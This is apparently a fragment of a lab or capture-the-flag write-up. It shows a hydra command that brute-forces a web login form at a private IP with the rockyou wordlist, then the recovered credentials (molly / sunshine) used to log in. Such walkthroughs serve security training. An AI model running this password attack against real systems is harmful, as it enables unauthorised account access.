...
```bash
sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.48.163.211 http-post-form "/login:username=^USER^&password=^PASS^:F=incorrect"
```
...
**Step 3:** Then I used the obtained password to login to molly's account. 
Username: molly
Password: sunshine
